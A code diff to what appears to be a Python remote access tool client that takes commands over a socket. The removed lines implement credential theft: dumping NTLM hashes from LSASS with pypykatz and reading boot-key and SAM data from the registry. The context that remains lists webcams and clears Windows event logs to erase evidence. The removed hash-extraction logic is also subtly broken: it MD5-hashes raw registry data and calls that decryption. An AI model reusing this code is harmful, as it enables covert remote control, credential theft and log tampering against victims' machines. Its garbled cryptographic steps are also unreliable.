@@ -14,7 +14,7 @@ import hashlib  # For calculating the hboot key
 import binascii  # For converting to/from binary and ASCII
 import os  # For process management
 import ctypes  # For Windows API calls
-import pypykatz
+
 
 # Function to get the default network interface
 def get_default_interface():
@@ -262,71 +262,6 @@ def list_webcams():
         return "No webcams found."
     return '\n'.join(webcams)
 
-
-def hashdump(client_socket):
-    try:
-        client_socket.send(b"[*] Dumping hashes...\n")
-
-        # Run pypykatz to dump hashes from LSASS
-        lsa_output = pypykatz.lsassy()
-
-        # Extract NTLM hashes
-        ntlm_hashes = []
-        for user, data in lsa_output.items():
-            if 'NTLM' in data:
-                ntlm_hash = data['NTLM']['lm']
-                ntlm_hashes.append(f"{user}: {ntlm_hash}")
-
-        if ntlm_hashes:
-            client_socket.send(f"HASHDUMP: {', '.join(ntlm_hashes)}\n".encode('utf-8'))
-        else:
-            client_socket.send(b"[*] No NTLM hashes found.\n")
-    except Exception as e:
-        client_socket.send(f"Error: {e}\n".encode('utf-8'))
-
-
-def get_boot_key():
-    # Function to obtain the boot key from the registry
-    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa")
-    value, _ = winreg.QueryValueEx(key, "JD")
-    boot_key = value[:16]  # Extract the first 16 bytes
-    winreg.CloseKey(key)
-    return boot_key
-
-def calculate_hboot_key(boot_key):
-    # Function to calculate the hboot key using the boot key
-    hboot_key = hashlib.md5(boot_key).digest()
-    return hboot_key
-
-def get_user_keys(hboot_key):
-    # Function to obtain the user list and keys from the registry
-    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users")
-    user_keys = {}
-    for i in range(winreg.QueryInfoKey(key)[0]):
-        user_key = winreg.EnumKey(key, i)
-        user_subkey = winreg.OpenKey(key, user_key)
-        user_data, _ = winreg.QueryValueEx(user_subkey, "V")
-        user_keys[user_key] = user_data
-        winreg.CloseKey(user_subkey)
-    winreg.CloseKey(key)
-    return user_keys
-
-def decrypt_user_keys(user_keys):
-    # Function to decrypt user keys using the hboot key
-    decrypted_keys = {}
-    for user_key, user_data in user_keys.items():
-        decrypted_key = hashlib.md5(user_data).digest()
-        decrypted_keys[user_key] = decrypted_key
-    return decrypted_keys
-
-def dump_password_hashes(decrypted_keys):
-    # Function to dump password hashes from decrypted keys
-    hashes = ""
-    for user_key, decrypted_key in decrypted_keys.items():
-        hash_value = binascii.hexlify(decrypted_key).decode('utf-8')
-        hashes += f"{user_key}: {hash_value}\n"
-    return hashes
-
 def main():
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -356,8 +291,7 @@ def main():
                 print("[*] Requesting webcam list...")
                 webcam_list = list_webcams()
                 client_socket.send(webcam_list.encode('utf-8'))
-            elif command == "hashdump":
-                hashdump(client_socket)
+                
             elif command == "clearev":
                 try:
                     application_log = subprocess.run("wevtutil cl Application", shell=True, capture_output=True, text=True)
